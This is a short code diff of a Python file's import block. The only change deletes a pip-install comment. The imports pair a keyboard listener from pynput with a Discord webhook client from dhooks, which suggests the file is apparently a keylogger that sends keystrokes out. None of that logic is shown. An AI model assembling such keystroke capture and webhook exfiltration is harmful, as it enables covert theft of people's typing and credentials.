@@ -8,7 +8,7 @@
 # ---------- Import of all important modules for the project ----------
 
 from pynput.keyboard import Key, Listener
-from dhooks import Webhook #pip install dhooks
+from dhooks import Webhook
 import logging
 import colorama
 from colorama import Fore, Back, Style
